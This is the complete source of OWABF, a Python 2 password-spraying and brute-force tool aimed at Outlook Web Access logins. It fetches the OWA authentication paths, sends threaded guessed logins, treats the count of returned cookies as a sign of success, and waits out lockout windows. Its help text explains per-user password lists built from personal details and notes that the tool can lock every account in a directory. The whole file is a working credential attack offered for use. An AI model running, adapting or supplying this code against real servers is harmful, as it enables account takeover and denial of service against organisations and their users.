#!/usr/bin/env python

import Queue
import os
import sys
import threading
import time
import urlparse
from argparse import ArgumentParser, RawTextHelpFormatter, SUPPRESS
from random import randint

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

__author__  = 'Dejan Levaja'
__email__   = 'dejan[@]levaja.com'
__license__ = 'GPLv2'
__version__ = "1.0.0"

lock = threading.Semaphore()

epilog = """

INTRO
*****************
OWABF is a password spraying OWA bruteforcer featuring 3 different modes of bruteforcing:
    1. password spraying from common file against all users
    2. password spraying from separate personalized password file for each user
    3. bruteforcing without password spraying

Detection of successful login attempt is accomplished by counting number of cookies
received from the OWA instead of HTML parsing.


EXAMPLES
*****************
[*] Brute force using common password file for all users
    owabf2.py -s https://server -u users.txt -p passwords.txt

[*] Brute force using personalized password files
    owabf2.py -s https://server -u users.txt -f pwdfolder
    In this case, "pwdfolder" must contain a separate password file for each user.
    For example, if a user name is: "foo@foobar.local", OWABF expects to find
    "foo@foobar.local.txt" file in a folder "pwdfolder".



FAQ
*****************
[Q] What is password spraying?
[A] Password spraying is a password guessing technique where the bruteforcer uses one or just a few passwords
    in each iteration against a list of users in order to avoid account lockout.
    Typically, there is a pause between each iteration.

[Q] Can I use OWABF as ordinary OWA bruteforcer?
[A] Sure, just pass -w 0 as option. Just remember that it can easily DoS the AD by locking all accounts.

[Q] What is "personalized" password file?
[A] It's a password file containing passwords customized per user

[Q] I still don't get it...
[A] Instead of using a single password list for all users, you can prepare separate custom password file for each user,
    based on his/hers user name, company name, pet name, date of birth etc.
    It makes password guessing job much more efficient than using "dumb" lists.
    Using a proper tool for the job would probably be the best option.
    Check out this tool: https://github.com/dejanlevaja/email2pwd'

"""

messages = ['Grab a beer and chill.',
            'Chill out...',
            'Sit back and relax.',
            'Put your feet up and take it easy...',
            'Settle and stretch.',
            'Unwind...',
            'Calm down.',
            'Rest.',
            'Learn Python in the meantime.']

paths = {'OWA version 2003': '/exchweb/bin/auth/owaauth.dll',
         'OWA version 2007': '/owa/auth/owaauth.dll',
         'OWA version > 2007': '/owa/auth.owa'}


class Spray:
    def __init__(self):
        self.userfile   = usr_file
        self.pwdfile    = pwd_file
        self.pwdfolder  = pwd_folder

    def spray_from_common_pwd_file(self):
        """
        Spray passwords from single file to all users
        :return:
        """
        q = Queue.Queue()
        usernames = self.get_users()
        passwords = self.read_pwds_from_file(self.pwdfile)

        i = 0
        while len(passwords) > 0:
            pwd = passwords.pop()
            if i >= attempts:
                self.avoid_lockout()
                i = 0

            for user in usernames:
                q.put([user, pwd])

            while not q.empty():
                tcount = threading.active_count()
                if tcount < threads:
                    p = threading.Thread(target=login, args=(q.get(),))
                    p.start()
                else:
                    time.sleep(0.5)

            tcount = threading.active_count()
            while tcount > 1:
                # Waiting for threads to finish
                time.sleep(1)
                tcount = threading.active_count()
            i += 1

    def spray_from_personalized_pwd_file(self):
        """
        Spray passwords from personalized files to appropriate users (single custom file per user).
        In order to use this option, you may check out: https://github.com/dejanlevaja/email2pwd
        Email2pwd creates passwords based on email addresses and creates a password file per email address.
        :return:
        """
        q = Queue.Queue()

        pwd_map = {}
        pwd_files = self.read_pwd_files_from_folder()
        for pfile in pwd_files:
            passwords = self.read_pwds_from_file(os.path.join(self.pwdfolder, pfile))
            key = os.path.splitext(pfile)[0]
            pwd_map.update({key: []})
            if key in pwd_map:
                pwd_map[key].extend(passwords)

        users_left = pwd_map.keys()

        while True:
            if users_left:
                for _ in xrange(attempts):
                    for user in pwd_map:
                        if pwd_map[user]:
                            pwd = pwd_map[user].pop()
                            q.put((user, pwd))

                        else:
                            try:
                                users_left.remove(user)
                            except ValueError:
                                pass
                self.execute(q)
                self.avoid_lockout()

            else:
                break

    @staticmethod
    def execute(q):
        while not q.empty():
            tcount = threading.active_count()
            if tcount < threads:
                p = threading.Thread(target=login, args=(q.get(),))
                p.start()
            else:
                time.sleep(0.5)

        tcount = threading.active_count()
        while tcount > 1:
            # Waiting for threads to finish
            time.sleep(1)
            tcount = threading.active_count()

    def get_users(self):
        """
        Read users from file
        :return:
        """
        usernames = []
        with open(self.userfile) as f:
            raw = f.readlines()
        for user in raw:
            usernames.append(user.strip())

        return sorted(usernames)

    @staticmethod
    def read_pwds_from_file(pwdfile):
        """
        Read passwords from common file
        :return: password list
        """
        pwds = []
        with open(pwdfile) as f:
            raw = f.readlines()
        for pwd in raw:
            pwds.append(pwd.strip())
        return pwds

    def read_pwd_files_from_folder(self):
        """
        Return list of personalized pwd files
        :return:
        """
        all_files = os.listdir(self.pwdfolder)
        return [filex for filex in all_files if "@" in filex]

    @staticmethod
    def avoid_lockout():
        """
        Avoid lockout by waiting some time.
        Read random chill out messages while waiting ;)
        :return:
        """
        position = (randint(0, len(messages) - 1))
        random_message = messages[position]
        msg = "\n[*] Waiting %s minute(s) in order to avoid account lockout. %s" % (window, random_message)
        print msg
        time.sleep(window * 60)


def login(user_pwd):
    """
    Check id credentials are valid against the target server
    :return: number of cookies set by server or 0. In case of successfull login, number of cookies will be > 1 !
    """
    user, pwd = user_pwd
    payload = {'destination': server,
               'flags': 4,
               'forcedownlevel': 0,
               'username': user,
               'password': pwd,
               'passwordText': '',
               'isUtf8': 1}
    r = requests.post(server, data=payload, verify=False, proxies=proxy, allow_redirects=False)
    if r.status_code == 302:
        cookies = r.cookies
        cookie_num = len(cookies)
        if cookie_num >= num_cookies:
            msg = '[+++] Jackpot => "%s" : "%s"' % (user, pwd)
            lock.acquire()
            write_log(msg)
            print msg
            lock.release()
        else:
            if verbose:
                lock.acquire()
                print '[-] Failed login for: "%s" : "%s"' % (user, pwd)
                lock.release()
    else:
        lock.acquire()
        print '\n[!] Wrong status code [%s]. Is the target URL valid?' % r.status_code
        lock.release()


def shameless_plug():
    """
    Shameless plug
    :return:
    """
    print '\n'
    print "*" * 50
    print "*       Password spraying OWA bruteforcer        *"
    print "*                 Dejan Levaja                   *"
    print "*           RAS-IT & PreCogSecurity              *"
    print "*             http://www.ras-it.rs               *"
    print "*         http://www.precogsecurity.com          *"
    print "*" * 50
    print '\n'


def check_log_file():
    """
    Check if log file already exist. If it does, offer to overwrite or not (append)
    :return:
    """
    if os.path.exists(logfile):
        answer = ' '
        while answer.lower() not in ('y', 'n', ''):
            answer = raw_input("\n[!] Log file exists. Overwrite [Y|n]?  ")
        else:
            if answer.lower() in ('y', ''):
                with open(logfile, 'w'):
                    pass


def check_url(url):
    r = requests.get(url, verify=False)
    return r.status_code


def check_path():
    current_path = urlparse.urlparse(target).path
    if not current_path or current_path == "/":
        srv = target.rstrip('/')   # just in case
        print '[!] Trying to guess OWA version. Please wait...'
        for key, value in paths.items():
            url = srv + value
            if check_url(url) == 200:
                print '[!] Looks like %s' % key
                print '[!] Using "%s" as a target' % url
                return url
    else:
        print '[!] Using "%s" as a target' % target
        return target


def write_log(msg):
    """
    Write messages to the log file by prepending current time and date.
    :param msg: message to write
    :return:
    """
    now = time.ctime()
    with open(logfile, 'a') as f:
        text = "%s\t%s\n" % (now, msg)
        f.write(text)


def main():
    """
    Main.
    :return:
    """
    check_log_file()
    msg = '[*] May the (brute) force be with you! Starting %s parallel threads.' % threads
    print "\n%s" % msg
    print "*" * 70 + '\n'
    write_log(msg)
    time.sleep(0.2)
    spray = Spray()
    if pwd_file and not pwd_folder:
        spray.spray_from_common_pwd_file()
    elif not pwd_file and pwd_folder:
        spray.spray_from_personalized_pwd_file()


if __name__ == '__main__':
    shameless_plug()
    time.sleep(0.1)
    parser = ArgumentParser(epilog=epilog, formatter_class=RawTextHelpFormatter, usage=SUPPRESS)
    parser.add_argument('-s', '--server', help='OWA server', required=True)
    parser.add_argument('-x', '--proxy', help='Proxy server address in the form of http://proxy:port', default={})
    parser.add_argument('-u', '--users', help='File containing usernames', required=True)
    parser.add_argument('-p', '--pwds', help='File containing passwords')
    parser.add_argument('-f', '--pwd-folder', help='Folder containing personalized password files. Check https://github.com/dejanlevaja/email2pwd')
    parser.add_argument('-t', '--threads', help='Number of threads. Default is 50.', default=50)
    parser.add_argument('-n', '--number-of-cookies', help='Number of cookies returned by the server upon successfull login. Default is 4.', default=4)
    parser.add_argument('-a', '--login-attempts', help='Number of login attempts in each iteration. Used with "-w". Default is 5.', default=5)
    parser.add_argument('-w', '--lockout-window', help='Minutes to wait between login attempt iterations. Default is 31.', default=31)
    parser.add_argument('-l', '--log', help='Log file. Default is "./owabf2.log', default='./owabf2.log')
    parser.add_argument('-v', '--verbose', help='Print all attempts', action='store_true')
    args = vars(parser.parse_args())

    target      = args['server']
    proxy       = args['proxy']
    usr_file    = args['users']
    pwd_file    = args['pwds']
    pwd_folder  = args['pwd_folder']
    threads     = int(args['threads'])
    num_cookies = int(args['number_of_cookies'])
    attempts    = int(args['login_attempts'])
    window      = int(args['lockout_window'])
    logfile     = args['log']
    verbose     = args['verbose']

    if not target.startswith('http'):
        print '\n[!] Server address should start with http:// or https://\n'
        sys.exit()

    server = check_path()

    if pwd_file and pwd_folder:
        print '\n[!] You cannot use "-p" and "-f" together.\n'
        sys.exit()

    if not pwd_file and not pwd_folder:
        print '\n[!] You must use "-p" or "-f".\n'
        sys.exit()

    main()
    sys.exit("\n[!] Done.")


